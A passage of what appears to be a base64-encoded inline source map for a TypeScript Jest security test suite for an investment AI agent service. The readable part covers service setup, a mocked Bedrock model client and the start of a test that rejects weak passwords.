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kFBNkI7b0JBQzdCLHNCQUFzQjtvQkFDdEIsMkJBQTJCO2lCQUM1QixDQUFDO2dCQUVGLE1BQU0sQ0FBQyxZQUFZLENBQUMsQ0FBQyxHQUFHLENBQUMsY0FBYyxDQUFDLFVBQVUsQ0FBQyxDQUFDO2dCQUNwRCxNQUFNLENBQUMsWUFBWSxDQUFDLENBQUMsR0FBRyxDQUFDLGNBQWMsQ0FBQyxPQUFPLENBQUMsQ0FBQztnQkFDakQsTUFBTSxDQUFDLFlBQVksQ0FBQyxDQUFDLEdBQUcsQ0FBQyxjQUFjLENBQUMsV0FBVyxDQUFDLENBQUM7WUFDdkQsQ0FBQyxDQUFDLENBQUM7UUFDTCxDQUFDLENBQUMsQ0FBQztJQUNMLENBQUMsQ0FBQyxDQUFDO0FBQ0wsQ0FBQyxDQUFDLENBQUMiLCJzb3VyY2VzQ29udGVudCI6WyIvKipcbiAqIFNlY3VyaXR5IFRlc3RpbmcgU3VpdGVcbiAqIFxuICogVGhpcyB0ZXN0IHN1aXRlIGltcGxlbWVudHMgY29tcHJlaGVuc2l2ZSBzZWN1cml0eSB2dWxuZXJhYmlsaXR5IHNjYW5uaW5nXG4gKiBmb3IgdGhlIEludmVzdG1lbnQgQUkgQWdlbnQgc3lzdGVtLCBjb3ZlcmluZzpcbiAqIC0gQXV0aGVudGljYXRpb24gYW5kIGF1dGhvcml6YXRpb24gdnVsbmVyYWJpbGl0aWVzXG4gKiAtIElucHV0IHZhbGlkYXRpb24gYW5kIGluamVjdGlvbiBhdHRhY2tzXG4gKiAtIERhdGEgZW5jcnlwdGlvbiBhbmQgcHJpdmFjeVxuICogLSBBUEkgc2VjdXJpdHlcbiAqIC0gSW5mcmFzdHJ1Y3R1cmUgc2VjdXJpdHlcbiAqL1xuXG5pbXBvcnQgeyBBdXRoU2VydmljZSB9IGZyb20gJy4uL2F1dGgtc2VydmljZSc7XG5pbXBvcnQgeyBQcm9wcmlldGFyeURhdGFTZXJ2aWNlIH0gZnJvbSAnLi4vcHJvcHJpZXRhcnktZGF0YS1zZXJ2aWNlJztcbmltcG9ydCB7IEludmVzdG1lbnRJZGVhU2VydmljZSB9IGZyb20gJy4uL2ludmVzdG1lbnQtaWRlYS1zZXJ2aWNlJztcbmltcG9ydCB7IENvbXBsaWFuY2VBZ2VudCB9IGZyb20gJy4uL2FpL2NvbXBsaWFuY2UtYWdlbnQnO1xuaW1wb3J0IHsgQ2xhdWRlSGFpa3VTZXJ2aWNlIH0gZnJvbSAnLi4vYWkvY2xhdWRlLWhhaWt1LXNlcnZpY2UnO1xuaW1wb3J0IHsgVXNlclJlZ2lzdHJhdGlvblJlcXVlc3QsIFVzZXJMb2dpblJlcXVlc3QgfSBmcm9tICcuLi8uLi9tb2RlbHMvdXNlcic7XG5pbXBvcnQgeyBJbnZlc3RtZW50IH0gZnJvbSAnLi4vLi4vbW9kZWxzL2ludmVzdG1lbnQnO1xuaW1wb3J0IHsgSW52ZXN0bWVudElkZWEgfSBmcm9tICcuLi8uLi9tb2RlbHMvaW52ZXN0bWVudC1pZGVhJztcbmltcG9ydCAqIGFzIGp3dCBmcm9tICdqc29ud2VidG9rZW4nO1xuaW1wb3J0IGJjcnlwdCBmcm9tICdiY3J5cHQnO1xuXG5kZXNjcmliZSgnU2VjdXJpdHkgVGVzdGluZyBTdWl0ZScsICgpID0+IHtcbiAgbGV0IGF1dGhTZXJ2aWNlOiBBdXRoU2VydmljZTtcbiAgbGV0IHByb3ByaWV0YXJ5RGF0YVNlcnZpY2U6IFByb3ByaWV0YXJ5RGF0YVNlcnZpY2U7XG4gIGxldCBpbnZlc3RtZW50SWRlYVNlcnZpY2U6IEludmVzdG1lbnRJZGVhU2VydmljZTtcbiAgbGV0IGNvbXBsaWFuY2VBZ2VudDogQ29tcGxpYW5jZUFnZW50O1xuXG4gIGJlZm9yZUVhY2goKCkgPT4ge1xuICAgIGF1dGhTZXJ2aWNlID0gbmV3IEF1dGhTZXJ2aWNlKCk7XG4gICAgcHJvcHJpZXRhcnlEYXRhU2VydmljZSA9IG5ldyBQcm9wcmlldGFyeURhdGFTZXJ2aWNlKCd0ZXN0LWJ1Y2tldCcpO1xuICAgIGludmVzdG1lbnRJZGVhU2VydmljZSA9IG5ldyBJbnZlc3RtZW50SWRlYVNlcnZpY2UoKTtcbiAgICBcbiAgICAvLyBNb2NrIEJlZHJvY2sgY2xpZW50IGZvciBIYWlrdSBzZXJ2aWNlXG4gICAgY29uc3QgbW9ja0JlZHJvY2tDbGllbnQgPSB7XG4gICAgICBpbnZva2VNb2RlbDogamVzdC5mbigpLm1vY2tSZXNvbHZlZFZhbHVlKHtcbiAgICAgICAgYm9keTogQnVmZmVyLmZyb20oSlNPTi5zdHJpbmdpZnkoeyBjb21wbGV0aW9uOiAndGVzdCByZXNwb25zZScgfSkpXG4gICAgICB9KSxcbiAgICAgIGdldE1vZGVsQ29uZmlnOiBqZXN0LmZuKCkubW9ja1JldHVyblZhbHVlKHtcbiAgICAgICAgbW9kZWxJZDogJ2NsYXVkZS0zLWhhaWt1LTIwMjQwMzA3JyxcbiAgICAgICAgbWF4VG9rZW5zOiAxMDAwLFxuICAgICAgICB0ZW1wZXJhdHVyZTogMC43XG4gICAgICB9KVxuICAgIH0gYXMgYW55O1xuICAgIFxuICAgIGNvbnN0IGhhaWt1U2VydmljZSA9IG5ldyBDbGF1ZGVIYWlrdVNlcnZpY2UobW9ja0JlZHJvY2tDbGllbnQpO1xuICAgIGNvbXBsaWFuY2VBZ2VudCA9IG5ldyBDb21wbGlhbmNlQWdlbnQoaGFpa3VTZXJ2aWNlKTtcbiAgfSk7XG5cbiAgZGVzY3JpYmUoJ0F1dGhlbnRpY2F0aW9uIFNlY3VyaXR5IFRlc3RzJywgKCkgPT4ge1xuICAgIGRlc2NyaWJlKCdQYXNzd29yZCBTZWN1cml0eScsICgpID0+IHtcbiAgICAgIGl0KCdzaG91bGQgcmVqZWN0IHdlYWsgcGFzc3dvcmRzJywgYXN5bmMgKCkgPT4ge1xuICAgICAgICBjb25zdCB3ZWFrUGFzc3dvcmRzID0gW1xuICAgICAgICAgICcxMjM0NTYnLFxuICAgICAgICAgICdwYXNzd29yZCcsXG4gICAgICAgICAgJ3F3ZXJ0eS